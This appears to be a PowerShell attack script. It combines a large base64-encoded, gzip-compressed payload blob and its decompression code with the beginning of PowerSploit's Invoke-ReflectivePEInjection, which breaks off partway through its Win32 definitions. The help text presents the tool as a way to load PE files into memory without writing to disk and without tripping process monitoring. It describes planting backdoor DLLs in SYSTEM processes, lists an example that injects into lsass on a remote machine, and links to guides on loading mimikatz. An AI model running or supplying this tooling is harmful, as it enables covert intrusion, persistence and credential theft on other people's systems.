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
p9/qP5Pfwlv2Z+ea2s7AWuXM3n1VX5xP4Y/o1IOzjlSs9jg+xgf2+xqvj+jr8san7D3R0eGSnl7xz/NvDNXdqEaknNd3Xf6Kvm5v1n67vY3huxtd/WEl83jt
j9SbeN/E4x19/ar+t1L5cs7l65Y/Uz+wn1/hvz3eljpI+mNe90f9wH5c86/7f23fK1+0T1/1d1+1f+/QH8WD7+gX/e/PPVUlUs9D6abypMIi2BEkXquz7/ml
z5M+N5UqFtm0lba7+A6m0UD+Zy0ylZoyu6hPjb6jvn7V9ZSd5l3UV9M3plKO0J7u2uCfFdo1UP+jBv5PPjXEf0lVMAin/tS03ak+tc755R3nx5yvFTi/kZXX
NSntz6qW9lffbVO+x/nqA+dXXc4/cr4ecX4z42taIa1/VCP82Ye755Tf5HzV5fxyxPkR52tzzq+7nJ/jfH3D+dhQS/mm9pC2v6ml82u4nN/lfDXjW1n5mPM1
ifPrO84vcr7+wPkq/POJ7+gKH189xb+icP6U87U559czvsz5+orzsYuf8qu6kdZv1FP8ywrnjzlf63N+LeMfOB8rCz5/Wf2GbnH5qKf4Gu4h5fc4X5U439px
/prztQLn1zP+PefrGV91j1y+9Xo2vhRfc8f5IeefPbbC+dmjTXn5WsY/8PIYf8pvFLLyOl3KyB7XSfHXXLq0kz3OLOWrFueXM/6Yl9ewiZfqT5/zd7y8HnF+
I+L8EucrlnNhT05N6dz+7DjfsGSuv5yvPnJ+ecf5j7OUr2X12xHn/+DltRzn1/ucn+PldYnzVSWX8iuzftq/H046v7rL+R3OVxecX9lx/pTzNY/za33Olzlf
n3J+M2tf0Udp+1MnnV/dynP7w/lqnfNNl/N7GX/B+eUC5z9yPjZluf2IOH8+4/wB51ez+p8yfoHz6xlf4nx9xPmNPuc/8Pb1e85X3AK37zO6NJU9/QaXX4vz
azrnFzjfyPgdzle7nF9WOH/A61clzq8UOH/Ky2ttzj97Vln72VPr8/IHXr8+4uUbWf3KDP47ebqNVP40t5jy6+Tfk+cb5xsFzu9zPvxzyrey8ous/PnD/ScW
NJl/4fhl/neY+V8sUFL5jTi/mJWvc/+pRdx/NjP/63J+JfPP68z/ZuUbCueXMv9ucf+oZv63lvnnB843Fc4fZP4X3ebyy/n7zP/2Ob+R1Y/Xlmn9HvePWuY/
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
'

#PSGzip decompression
$data = [System.Convert]::FromBase64String($CompressedString)
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null
$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
$InputString = $sr.ReadToEnd()


function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.
    
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
    
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.
    
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
    -Can return DLL output to user when run remotely or locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
    -Can NOT return DLL output to the user when run remotely OR locally.
    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t* : FuncReturnType = WString
char* : FuncReturnType = String
void : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString : WStringFunc
String : StringFunc
Void : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )
    
    ###################################
    ########## Win32 Stuff ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        # This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        ################################################################################################
        #                              ADAPTED TO PS7	                                               #
        ################################################################################################
        $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynamicAssembly, 'Run')
        # $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ################################################################################################
        #                              END ADAPTED TO PS7	                                       #
        ################################################################################################
